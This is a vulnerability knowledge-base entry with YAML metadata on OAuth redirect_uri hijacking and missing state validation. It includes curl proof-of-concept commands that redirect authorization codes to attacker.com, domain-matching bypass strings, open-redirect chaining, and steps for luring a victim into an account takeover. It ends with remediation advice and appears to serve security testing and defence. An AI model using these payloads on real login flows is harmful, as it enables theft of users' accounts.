---
id: "oauth-redirect-uri"
title: "OAuth redirect_uri hijacking / missing state (account takeover)"
kind: "implementation"
cve: null
related-cves: null
cve-note: "None (implementation flaw)"
severity: "high"
cvss: 8.6
severity-basis: "cvss"
severity-note: null
product: "Custom third-party login (Google/WeChat/Telegram)"
versions: "Any"
ports: "80, 443"
keywords: "oauth, redirect_uri, state, login, takeover, sso"
entry: "Tamperable /oauth/authorize?redirect_uri="
verified: false
verified-on: null
verification-evidence: null
source-url: null
vendor-advisory: null
cwe: null
patch-date: null
sources: "Compiled from public sources (implementation flaws)"
kev: null
kev-date: null
kev-source: null
epss: null
epss-percentile: null
epss-date: null
epss-source: null
enrichment-updated: null
---

## Fingerprinting

```
GET /oauth/authorize?client_id=..&redirect_uri=..&response_type=code
Callback page /oauth/callback?code=
```

## Prerequisites

- Insufficient callback-domain validation (prefix/suffix/subdomain/open redirect).

## PoC

```bash
# 1) Change the callback to the attacker's domain
curl -s -D- -o /dev/null 'https://target/oauth/authorize?client_id=web&redirect_uri=https://attacker.com/cb&response_type=code&state=x' \
  | grep -i location
# Confirmation: Location contains attacker.com and code=

# 2) Subdomain/suffix bypasses
#   https://target.com.attacker.com
#   https://attacker.com/target.com
#   https://target.com@attacker.com
# 3) Use an on-site open redirect as a stepping stone (/jump?url=)
curl -s -D- -o /dev/null 'https://target/oauth/authorize?client_id=web&redirect_uri=https://target/jump?url=https://attacker.com&response_type=code'
```

```bash
# 4) Separately test missing state: remove state and check whether it is still accepted (CSRF can link the attacker's account)
```

## Exploitation Steps

1. First test whether exact matching can be bypassed (read-only inspection of Location);
2. If successful, induce the victim to click the link so the attacker receives the code;
3. Exchange the code for a token → takeover;
4. Evidence: the Location header + records of the received code.

## Remediation and Mitigation

- Require exact matching against the redirect_uri allowlist; require state and validate it once only; bind the code to PKCE.

## References

- OAuth 2.0 security best practices; CWE-601.
